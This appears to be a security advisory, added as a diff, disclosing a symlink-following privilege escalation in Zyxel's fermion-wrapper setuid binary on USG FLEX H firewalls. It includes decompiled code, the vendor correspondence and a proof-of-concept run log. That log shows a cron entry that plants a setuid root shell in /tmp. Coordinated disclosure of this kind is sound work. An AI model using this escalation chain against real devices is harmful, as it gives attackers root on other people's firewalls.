@@ -1,0 +1,365 @@
+--[ HNS-2025-10 - HN Security Advisory - https://security.humanativaspa.it/
+
+* Title: Local privilege escalation via Zyxel fermion-wrapper
+* Product: USG FLEX H Series
+* OS: Zyxel uOS V1.31 (and potentially earlier versions)
+* Author: Marco Ivaldi <marco.ivaldi@hnsecurity.it>
+* Date: 2025-04-23
+* CVE ID: CVE-2025-1731 (see discussion in "5 - Remediation" below)
+* Severity: High - 7.8 - CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+* CWE ID: CWE-61 - https://cwe.mitre.org/data/definitions/61.html
+* HN Security URLs:
+  https://github.com/hnsecurity/vulns/blob/main/HNS-2025-10-zyxel-fermion.txt
+  https://github.com/0xdea/exploits/blob/master/zyxel/raptor_fermion
+  https://security.humanativaspa.it/local-privilege-escalation-on-zyxel-usg-flex-h-series-cve-2025-1731
+* Vendor URLs:
+  https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-incorrect-permission-assignment-and-improper-privilege-management-vulnerabilities-in-usg-flex-h-series-firewalls-04-22-2025
+  https://community.zyxel.com/en/discussion/28988/usg-flex-h-series-v1-32patch-0-firmware-release
+
+--[ 0 - Table of contents
+
+1 - Summary
+2 - Background
+3 - Vulnerabilities
+    3.1 - Analysis
+    3.2 - Exploitation
+4 - Affected products
+5 - Remediation
+6 - Disclosure timeline
+7 - Acknowledgments
+8 - References
+
+--[ 1 - Summary
+
+"So we wait, this is our labour... we wait."
+              -- Anthony Swofford on fuzzing
+
+The Zyxel USG FLEX H Series is a high-performance firewall series designed to
+meet the needs of demanding and high-speed networks. It features several
+gigabit ports, a user-friendly in-house operating system, and excellent
+performance for tasks like UTM (Unified Threat Management) and VPN (Virtual
+Private Network) functionalities. The USG FLEX H Series offers faster boot
+times and improved CPU performance, making it superior to the standard USG FLEX
+Series [1].
+
+We have identified some security vulnerabilities in the Zyxel uOS Linux-based
+operating system distributed with these appliances, that allow local users with
+access to a Linux OS shell to escalate privileges to root.
+
+--[ 2 - Background
+
+Because of our previous public research on Zyxel appliances [2], after
+discovering a remote command execution vulnerability (CVE-2025-1731) in the
+latest USG FLEX H Series [3], Alessandro Sgreccia (@rainpwn) of HackerHood
+contacted us and asked for help with finding local privilege escalation
+vectors.
+
+Since USG FLEX H Series devices are based on a new aarch64 hardware and ship
+with a completely revamped Linux-based operating system (Zyxel uOS) that is
+supposed to be "secure by default" (a claim reminiscent of Oracle's
+"unbreakable" marketing campaign in the days of yore [4]), we couldn't resist
+giving it a try... We quickly identified a viable privilege escalation vector
+related to the `Recovery Manager` functionality (CVE-2025-1732) that was
+reported to the vendor by Alessandro together with his other findings [3].
+
+However, we were not done yet. Since Alessandro kindly provided us with access
+to his USG FLEX 100H test device, we decided to keep looking for some other
+low-hanging fruits, as an excuse to battle-test our new "vulnerability
+divination" suite written in Rust [5] [6]. We started by examining setuid root
+binaries distributed with the OS.
+
+--[ 3 - Vulnerabilities
+
+The custom setuid root binary program `/usr/sbin/fermion-wrapper` follows
+symbolic links in the `/tmp` directory when run with the `register-status`
+argument. This allows local users with access to a Linux OS shell to trick the
+program into creating writable files at arbitrary locations in the filesystem.
+This vulnerability can be exploited to overwrite arbitrary files or locally
+escalate privileges from low-privileged user (e.g., `postgres`) to root.
+
+In addition, we identified a second issue in the filesystem: the `/tmp`
+directory doesn't have the sticky bit set. This small, overlooked detail
+simplifies exploitation of the `fermion-wrapper` vulnerability and may also
+open the door to all sorts of havoc.
+
+--[ 3.1 - Analysis
+
+We leveraged our haruspex [7] and oneiromancer [8] tools to streamline our
+binary audit workflow:
+
+```
+raptor@fnord Downloads % haruspex fermion-wrapper
+haruspex 0.4.1 - Tool to extract IDA decompiler's pseudo-code
+Copyright (c) 2024-2025 Marco Ivaldi <raptor@0xdeadbeef.info>
+
+[*] Trying to analyze binary file "fermion-wrapper"
+[+] Successfully analyzed binary file
+
+[-] Processor: ARM Little-endian
+[-] Compiler: GNU
+[-] File type: ELF
+
+[*] Preparing output directory "fermion-wrapper.dec"
+[+] Output directory is ready
+
+[*] Extracting pseudo-code of functions...
+
+...
+
+[+] Decompiled 98 functions into "fermion-wrapper.dec"
+[+] Done processing binary file "fermion-wrapper"
+
+raptor@fnord Downloads % oneiromancer fermion-wrapper.dec/sub_4068AC@4068AC.c
+oneiromancer 0.3.0 - GenAI assistant for C code analysis
+Copyright (c) 2025 Marco Ivaldi <raptor@0xdeadbeef.info>
+
+[*] Analyzing source code in "fermion-wrapper.dec/sub_4068AC@4068AC.c"
+[+] Successfully analyzed source code
+
+/*
+ * getDeviceRegistrationStatus()
+ *
+ * This function retrieves the registration status of a device and stores
+ * it in provided pointers. It uses cURL to make an HTTP request to a
+ * specific URL with various options set for authentication and certificate
+ * verification. The response is parsed using JSON to extract relevant
+ * information about the device's registration status. If successful,
+ * it updates cache files and performs additional actions based on the
+ * registration status.
+ */
+
+...
+
+[*] Saving improved source code in "fermion-wrapper.dec/sub_4068AC@4068AC.out.c"
+[+] Done analyzing source code
+```
+
+We ended up with the following relevant pseudo-code for the `sub_4068AC`
+function, that is called directly by `main`:
+
+```c
+__int64 __fastcall sub_4068AC(_DWORD *isRegistered, _DWORD *isNeoAgentRegistered, _DWORD *bundleLicenseStatus)
+{
+...
+  requestUrl = "https://he.myzyxel.com/v1/device/status";
+  jsonData = 0LL;
+  operationResult = -1;
+  statusCheckResult = 7;
+  if ( geteuid() )
+    sub_4072FC("/usr/bin/sudo", "/usr/bin/sudo", "/usr/bin/touch");
+  bufferSize = sub_4067DC(deviceName, 20);
+  curlHandle = curl_easy_init(bufferSize);
+  if ( curlHandle )
+  {
+    bioMemHandle = BIO_s_mem();
+    bioHandle = BIO_new(bioMemHandle);
+    if ( bioHandle )
+    {
+...
+      errorCode = curl_easy_perform(curlHandle);
+      if ( !errorCode )
+      {
+        jsonData = (unsigned __int64 *)json_load_callback(sub_406878, bioHandle, 0LL, &jsonDataPointer);
+        if ( jsonData )
+        {
+          statusValue = (_DWORD *)json_object_get(jsonData, "register");
+...
+          if ( !operationResult )
+          {
+            statusCheckResult = 0;
+            statusCode = 2 * (2 * *isRegistered + *isNeoAgentRegistered) + *bundleLicenseStatus;
+            fileStream = fopen("/share/neoagent/cache_register_status", "w");
+            if ( fileStream )
+            {
+              fprintf(fileStream, "%s\n", deviceName);
+              fprintf(fileStream, "%d\n", statusCode);
+              fclose(fileStream);
+            }
+            fileStream = fopen("/tmp/register_status", "w"); // VULN
+            if ( fileStream )
+            {
+              fprintf(fileStream, "%s\n", deviceName);
+              fprintf(fileStream, "%d\n", statusCode);
+              fclose(fileStream);
+            }
+            sub_406518(statusCheckResult, deviceName, errorCode);
+            if ( !access("/usr/sbin/dha_send_fsync", 0) )
+            {
+              sub_4072FC("/usr/sbin/build_dha_cert_neoagent.sh", "/usr/sbin/build_dha_cert_neoagent.sh", 0LL);
+              sub_4072FC("/usr/sbin/dha_send_fsync", "/usr/sbin/dha_send_fsync", "8");
+            }
+          }
+...
+```
+
+As you might suspect, the vulnerability lies at the line marked with `VULN`:
+the binary running with elevated privileges can be tricked into following a
+symbolic link placed in `/tmp/register_status` by a local low-privileged user.
+
+As mentioned earlier, exploitation is simplified by the lack of sticky bit in
+the filesystem permissions of the `/tmp` directory, that allows an attacker to
+replace any existent `/tmp/register_status` file even if it's owned by another
+user, including root:
+
+```
+$ ls -ld /tmp
+drwxrwxrwx 30 root root 2240 Feb 27 18:16 /tmp # ¯\_(ツ)_/¯
+```
+
+--[ 3.2 - Exploitation
+
+We have crafted a proof-of-concept exploit [9] that demonstrates how to achieve
+local privilege escalation. It can be used as follows:
+
+```
+$ ./raptor_fermion
+raptor_fermion - Zyxel fermion-wrapper root LPE exploit
+Copyright (c) 2025 Marco Ivaldi <raptor@0xdeadbeef.info>
+
+[*] Exploiting /usr/sbin/fermion-wrapper
+$ uname -a
+Linux FLEX100H-HackerHood 4.14.207-10.3.7.0-2 #5 SMP PREEMPT Thu Jan 9 04:34:58 UTC 2025 aarch64 GNU/Linux
+$ id
+uid=502(postgres) gid=502(postgres) groups=502(postgres)
+$ ls -l /usr/sbin/fermion-wrapper
+-rwsr-xr-x 1 root root 44288 Jan  9 05:34 /usr/sbin/fermion-wrapper
+{"status": 0, "registered": 1, "nebula_registered": 1, "bundle": 1}
+
+[+] Everything looks good \o/, wait an hour and check /tmp/pwned
+$ ls -l /etc/cron.d/runme
+-rw-rw-rw- 1 root postgres 79 Feb 14 15:52 /etc/cron.d/runme
+$ cat /etc/cron.d/runme
+* * * * *   cp /bin/sh /tmp/pwned; chmod 4755 /tmp/pwned; rm /etc/cron.d/runme
+
+[+] Run the shell as follows to bypass bash checks: /tmp/pwned -p
+
+[about one hour later...]
+
+$ ls -l /tmp/pwned
+-rwsr-xr-x 1 root root 916608 Feb 14 16:25 /tmp/pwned
+$ /tmp/pwned -p
+# id
+uid=502(postgres) gid=502(postgres) euid=0(root) groups=502(postgres)
+# R00t D4nc3!!!111! \o/
+```
+
+The code should be straightforward to understand. Note how we pulled off the
+old-school `umask 0` trick to be able to control the content of the file
+created by the vulnerable setuid binary. Also note how for some reason files in
+`/etc/cron.d` get processed every 50 minutes or so, instead of almost instantly
+as it happens on a standard Linux distribution... We leave the quest of looking
+for a better exploitation vector as an exercise for you, dear reader;)
+
+--[ 4 - Affected products
+
+We confirmed the vulnerabilities in the following products and firmware
+versions:
+
+```
+$ cat /rw/fwversion
+...
+MODEL_ID=USG FLEX 100H
+KERNEL_VERSION=4.14
+CAPWAP_VER=undefined
+FIRMWARE_VER=1.31(ABXF.0)
+KERNEL_BUILD_DATE=2025-01-09 04:35:09
+BUILD_DATE=2025-01-09 04:35:47
+FSH_VER=1.0.0
+```
+
+```
+$ cat /rw/fwversion
+...
+MODEL_ID=USG FLEX 200H
+KERNEL_VERSION=4.14
+CAPWAP_VER=undefined
+FIRMWARE_VER=1.31(ABWV.0)
+KERNEL_BUILD_DATE=2025-01-09 05:10:23
+BUILD_DATE=2025-01-09 05:11:31
+FSH_VER=1.0.0
+```
+
+Other products and earlier firmware versions may also be vulnerable. Please
+refer to Zyxel's official security advisory for additional information.
+
+--[ 5 - Remediation
+
+During the whole coordinated disclosure process, Zyxel was very responsive.
+
+Unfortunately, they insisted in using the already-assigned CVE-2025-1731 as the
+identifier for our local privilege escalation vulnerability. These are their
+statements in this regard:
+
+"Our product team has identified that the attack surface of the local
+privileges escalation issue stems from an incorrect permission assignment
+within the PostgreSQL commands. This misconfiguration grants users with
+'postgres' privileges the ability to access the Linux shell. A similar issue
+was recently reported by another researcher, and CVE-2025-1731 has been
+reserved to identify the vulnerability."
+ 
+"We kindly request any evidence demonstrating an alternative method to access
+the device's Linux shell for executing the malicious scripts or the PoC
+exploit, 'raptor_fermion,' that you previously shared. If such evidence is
+unavailable, we will proceed with using CVE-2025-1731 as the identifier for
+this issue."
+
+"We could not identify any explicit evidence in your report that demonstrates
+an alternative method distinct from CVE-2025-1731 that would allow attackers to
+gain access to the Linux shell. Consequently, we have decided not to assign a
+separate CVE ID to the local privilege escalation issue, as it aligns with the
+attack surface of CVE-2025-1731. Nevertheless, we appreciate your finding and
+will ensure it is acknowledged in CVE-2025-1731."
+
+We regret any confusion caused by this decision.
+
+As for the lack of sticky bit in the `/tmp` directory, Zyxel stated the
+following:
+
+"We currently do not consider this a security issue. However, we are open to
+reevaluating if you can provide a clear example demonstrating how it could
+result in a denial of service (DoS) problem. Otherwise, we will treat this as
+an implementation flaw rather than a vulnerability."
+
+Please refer to Zyxel's official security advisory for patching information. We
+have not checked the effectiveness of the fixes.
+
+--[ 6 - Disclosure timeline
+
+The coordinated disclosure timeline follows:
+
+2025-02-05: Alessandro Sgreccia contacted us to propose a collaboration.
+2025-03-10: Zyxel PSIRT was notified via <security@zyxel.com.tw> and
+            acknowledged receipt of our advisory and PoC exploit.
+2025-03-17: Zyxel PSIRT communicated their intention of using the
+	    already-assigned CVE-2025-1731 as the identifier for our LPE.
+2025-03-17: We disagreed with Zyxel PSIRT and explained that using an unrelated
+            CVE identifier for our issues would likely cause confusion.
+2025-03-18: Zyxel PSIRT confirmed their decision of not assigning a separate
+            CVE ID to the local privilege escalation issue; they also stated
+            that they don't consider the lack of sticky bit in `/tmp` a
+            security issue, but simply an implementation flaw.
+2025-04-15: Zyxel released version 1.32 of its firmware that includes fixes for
+            the reported vulnerabilities.
+2025-04-22: Zyxel PSIRT published their security advisory [3].
+2025-04-22: Alessandro Sgreccia published his security advisory.
+2025-04-23: HN Security published this advisory with full details.
+
+--[ 7 - Acknowledgments
+
+We would like to thank Alessandro Sgreccia (@rainpwn) of HackerHood for
+involving us in his research and for kindly providing access to his USG FLEX
+100H test device. It's been a pleasure working together!
+
+--[ 8 - References
+
+[1] https://support.zyxel.eu/hc/en-us/sections/17702103398546-Series-USG-FLEX-H
+[2] https://security.humanativaspa.it/tag/zyxel/
+[3] https://0xdeadc0de.xyz/blog/cve-2025-1731_cve-2025-1732
+[4] https://www.zdnet.com/article/oracles-unbreakable-toy-story/
+[5] https://security.humanativaspa.it/streamlining-vulnerability-research-with-ida-pro-and-rust/
+[6] https://security.humanativaspa.it/aiding-reverse-engineering-with-rust-and-a-local-llm/
+[7] https://github.com/0xdea/haruspex
+[8] https://github.com/0xdea/oneiromancer
+[9] https://github.com/0xdea/exploits/blob/master/zyxel/raptor_fermion
+
+Copyright (c) 2025 Marco Ivaldi and Humanativa Group. All rights reserved.
